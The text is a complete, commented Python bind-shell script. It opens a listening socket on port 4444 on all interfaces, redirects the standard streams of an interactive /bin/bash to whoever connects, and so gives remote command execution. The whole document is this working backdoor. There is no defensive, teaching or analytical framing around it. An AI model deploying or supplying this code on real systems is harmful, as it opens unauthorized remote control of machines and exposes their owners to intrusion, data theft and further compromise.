import socket
import os
import subprocess

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to all available interfaces on port 4444
s.bind(("0.0.0.0", 4444))

# Listen for incoming connections (backlog of 5)
s.listen(5)

print("Waiting for incoming connection...")

# Accept a client connection
c, a = s.accept()

print("Accepted connection from:", a)

# Duplicate the socket file descriptors to stdin, stdout, and stderr
os.dup2(c.fileno(), 0)
os.dup2(c.fileno(), 1)
os.dup2(c.fileno(), 2)

# Execute a shell (/bin/sh) with interactive mode (-i)
p = subprocess.call(["/bin/bash", "-i"])

